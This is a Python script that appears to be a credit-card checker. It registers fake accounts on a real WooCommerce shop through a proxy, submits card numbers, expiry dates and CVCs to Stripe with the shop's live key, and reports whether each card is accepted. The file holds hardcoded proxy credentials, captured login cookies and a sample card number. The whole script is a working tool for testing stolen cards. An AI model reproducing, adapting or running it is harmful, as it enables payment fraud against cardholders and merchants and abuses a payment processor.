import random
import string
import requests
from user_agent import generate_user_agent
from proxy import reqproxy, make_request
import json
import re

#============================================
def generate_full_name():
    first_names = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein", "Maha", "Tarek", "Laila", "Abdul", "Hana", "Mustafa", "Leila", "Kareem", "Hala", "Karim", "Nabil", "Samir", "Habiba", "Dina", "Youssef", "Rasha", "Majid", "Nabil", "Nadia", "Sami", "Samar", "Amal", "Iman", "Tamer", "Fadi", "Ghada", "Ali", "Yasmin", "Hassan", "Nadia", "Farah", "Khalid", "Mona", "Rami", "Aisha", "Omar", "Eman", "Salma", "Yahya", "Yara", "Husam", "Diana", "Khaled", "Noura", "Rami", "Dalia", "Khalil", "Laila", "Hassan", "Sara", "Hamza", "Amina", "Waleed", "Samar", "Ziad", "Reem", "Yasser", "Lina", "Mazen", "Rana", "Tariq", "Maha", "Nasser", "Maya", "Raed", "Safia", "Nizar", "Rawan", "Tamer", "Hala", "Majid", "Rasha", "Maher", "Heba", "Khaled", "Sally"]
    last_names = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown", "Garcia", "Martinez", "Lopez", "Gonzalez", "Rodriguez", "Walker", "Young", "White", "Ahmed", "Chen", "Singh", "Nguyen", "Wong", "Gupta", "Kumar", "Gomez", "Lopez", "Hernandez", "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres", "Flores", "Rivera", "Silva", "Reyes", "Alvarez", "Ruiz", "Fernandez", "Valdez", "Ramos", "Castillo", "Vazquez", "Mendoza", "Bennett", "Bell", "Brooks", "Cook", "Cooper", "Clark", "Evans", "Foster", "Gray", "Howard", "Hughes", "Kelly", "King", "Lewis", "Morris", "Nelson", "Perry", "Powell", "Reed", "Russell", "Scott", "Stewart", "Taylor", "Turner", "Ward", "Watson", "Webb", "White", "Young"]
    return random.choice(first_names), random.choice(last_names)

def generate_address():
    cities = ["London", "Birmingham", "Manchester", "Liverpool", "Leeds", "Glasgow", "Sheffield", "Edinburgh", "Bristol", "Cardiff"]
    states = ["England", "England", "England", "England", "England", "Scotland", "England", "Scotland", "England", "Wales"]
    streets = ["Baker St", "Oxford St", "High St", "King's Rd", "Abbey Rd", "The Strand", "Regent St", "Whitehall", "Fleet St", "Pall Mall"]
    zip_codes = ["SW1A 1AA", "W1D 3QF", "M1 1AE", "N1C 4AG", "EC1A 1BB", "SE1 8XX", "B1 1AA", "RG1 8DN", "SW1E 5RS", "B2 5DT"]
    
    city = random.choice(cities)
    street_address = f"{random.randint(1, 999)} {random.choice(streets)}"
    zip_code = random.choice(zip_codes)
    return street_address, city, "GB", zip_code, f"07{random.randint(100000000, 999999999)}"

def generate_email():
    return f"user{random.randint(10000,99999)}@example.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))

def generate_random_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

#============================================
def Tele(ccx):
    proxy_str = "brd.superproxy.io:33335:brd-customer-hl_5c664e64-zone-datacenter_proxy1:0bnfn02i83lj"
    session, ip = reqproxy(proxy_str)
    #print(f"IP Address: {ip}")
    ccx=ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:#Mo3gza
        yy = yy.split("20")[1]
    #elif "01" in mm or "02" in mm or "01" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
        #mm = mm.split("0")[1]

    user = generate_user_agent()
    r = requests.Session()
    r.verify = False
    
    first_name, last_name = generate_full_name()
    kaddress, city, country, postcode, phone =     generate_address()
    kaddress, city, country, postcode, phone = generate_address()
    email = generate_email()
    username = generate_username()
    corr = generate_random_code()
    sess = generate_random_code()
    nr = random.randint(100000, 999999)
    lr = random.randint(1000, 9999)

    headers = {
        'authority': 'theblacksheepshop.in',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'referer': 'https://theblacksheepshop.in/my-account/payment-methods/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    response = session.get('https://theblacksheepshop.in/my-account/add-payment-method/', headers=headers)
    
    register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
    print(register)

    cookies = {
        '_ga': 'GA1.1.815861040.1779155774',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_first_add': 'fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F',
        '__stripe_mid': '863eb0b8-2187-42c9-b66e-040b91ce6edaa9ec9e',
        '__stripe_sid': '9aaa3c6e-6516-416c-a93a-84e5c1080a2a38613a',
        '_ga_G9CEBP6031': 'GS2.1.s1779155773$o1$g1$t1779155798$j35$l0$h0',
    }
    
    headers = {
        'authority': 'theblacksheepshop.in',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '_ga=GA1.1.815861040.1779155774; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F; __stripe_mid=863eb0b8-2187-42c9-b66e-040b91ce6edaa9ec9e; __stripe_sid=9aaa3c6e-6516-416c-a93a-84e5c1080a2a38613a; _ga_G9CEBP6031=GS2.1.s1779155773$o1$g1$t1779155798$j35$l0$h0',
        'origin': 'https://theblacksheepshop.in',
        'referer': 'https://theblacksheepshop.in/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': user,
    }
    
    data = {
        'email': f'genpaypal{nr}@gmail.com',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': 'https://theblacksheepshop.in/my-account/payment-methods/',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://theblacksheepshop.in/my-account/add-payment-method/',
        'wc_order_attribution_session_start_time': '2026-05-19 01:56:13',
        'wc_order_attribution_session_pages': '1',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'woocommerce-register-nonce': f'{register}',
        '_wp_http_referer': '/my-account/add-payment-method/',
        'register': 'Register',
    }
    
    response = session.post(
        'https://theblacksheepshop.in/my-account/add-payment-method/',
        #cookies=cookies,
        headers=headers,
        data=data,
    )
    
    ajax = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', response.text).group(1)
    print(ajax)

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': user,
    }
    
    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TH&payment_user_agent=stripe.js%2Fc30beb05a2%3B+stripe-js-v3%2Fc30beb05a2%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftheblacksheepshop.in&time_on_page=47455&client_attribution_metadata[client_session_id]=57ca1ad5-64b2-4914-9786-6868d8c0d050&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1XWrzijx1Am&client_attribution_metadata[elements_session_config_id]=dc45afad-5700-490d-8ecd-4e28ddc5c537&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=NA&muid=NA&sid=NA&key=pk_live_51PySNkCdnuLfrUleTNJPo8KexXRjjnsDtIpJzva5xH09kZoz4xALflAPSUaXe83dWHnmSsF6PoNlDijA7aaqo7fc00fjCniU0Y&_stripe_version=2024-06-20'
    
    response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    pm = response.json()['id']
    print(pm)
    
    cookies = {
        'wordpress_sec_3fdb9a11f2ec389c65196c4320d6bc94': 'genpaypal09%7C1780365403%7C6nuQtoXyj9AKDuzMwcKOfS8oHuQHuZeyoBsNx9OqGud%7Ccbe2c6b4e5727f0872e29a405cafc211e0cce96428c38fca3e48b812ac6dbc7c',
        '_ga': 'GA1.1.815861040.1779155774',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_first_add': 'fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        '__stripe_mid': '863eb0b8-2187-42c9-b66e-040b91ce6edaa9ec9e',
        '__stripe_sid': '9aaa3c6e-6516-416c-a93a-84e5c1080a2a38613a',
        '_lscache_vary': '352ab313fb553b360bbb4cdbfdf3bf3a',
        'wordpress_logged_in_3fdb9a11f2ec389c65196c4320d6bc94': 'genpaypal09%7C1780365403%7C6nuQtoXyj9AKDuzMwcKOfS8oHuQHuZeyoBsNx9OqGud%7C6653ccad1d7e24b29422fdad388bf7c69a67d56bebc9f449da75b3497c2deb24',
        '_ga_G9CEBP6031': 'GS2.1.s1779155773$o1$g1$t1779155803$j30$l0$h0',
        'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F',
    }
    
    headers = {
        'authority': 'theblacksheepshop.in',
        'accept': '*/*',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'wordpress_sec_3fdb9a11f2ec389c65196c4320d6bc94=genpaypal09%7C1780365403%7C6nuQtoXyj9AKDuzMwcKOfS8oHuQHuZeyoBsNx9OqGud%7Ccbe2c6b4e5727f0872e29a405cafc211e0cce96428c38fca3e48b812ac6dbc7c; _ga=GA1.1.815861040.1779155774; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F; sbjs_first_add=fd%3D2026-05-19%2001%3A56%3A13%7C%7C%7Cep%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fpayment-methods%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; __stripe_mid=863eb0b8-2187-42c9-b66e-040b91ce6edaa9ec9e; __stripe_sid=9aaa3c6e-6516-416c-a93a-84e5c1080a2a38613a; _lscache_vary=352ab313fb553b360bbb4cdbfdf3bf3a; wordpress_logged_in_3fdb9a11f2ec389c65196c4320d6bc94=genpaypal09%7C1780365403%7C6nuQtoXyj9AKDuzMwcKOfS8oHuQHuZeyoBsNx9OqGud%7C6653ccad1d7e24b29422fdad388bf7c69a67d56bebc9f449da75b3497c2deb24; _ga_G9CEBP6031=GS2.1.s1779155773$o1$g1$t1779155803$j30$l0$h0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Ftheblacksheepshop.in%2Fmy-account%2Fadd-payment-method%2F',
        'origin': 'https://theblacksheepshop.in',
        'referer': 'https://theblacksheepshop.in/my-account/add-payment-method/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': f'{pm}',
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': f'{ajax}',
    }
    
    response = session.post('https://theblacksheepshop.in/wp-admin/admin-ajax.php', #cookies=cookies, 
    headers=headers, data=data)
    try:
        result = re.search(r'"message":"(.*?)"', response.text).group(1)
    except:
        result = re.search(r'"status":"(.*?)"', response.text).group(1)

    return result
    
#test_card = "4340763002168759|08|28|193"
#print(Tele(test_card))
